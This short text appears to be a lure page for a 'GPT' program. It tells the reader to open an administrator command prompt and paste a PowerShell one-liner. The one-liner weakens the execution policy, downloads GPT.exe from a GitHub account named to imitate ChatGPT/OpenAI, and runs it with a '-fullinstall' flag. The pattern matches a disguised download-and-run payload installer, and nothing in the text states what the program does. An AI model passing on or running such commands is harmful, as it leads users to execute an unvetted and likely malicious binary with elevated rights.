DOWNLOAD AND RUN CMD ADMINISTRATOR
GPT.exe -fullinstall

powershell 
examp

Set-ExecutionPolicy RemoteSigned -Force;$Url = 'https://github.com/chatgptopenai9001/Chat/raw/main/GPT.exe';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';;Invoke-WebRequest $Url -OutFile GPT.exe;.\GPT.exe -fullinstall;
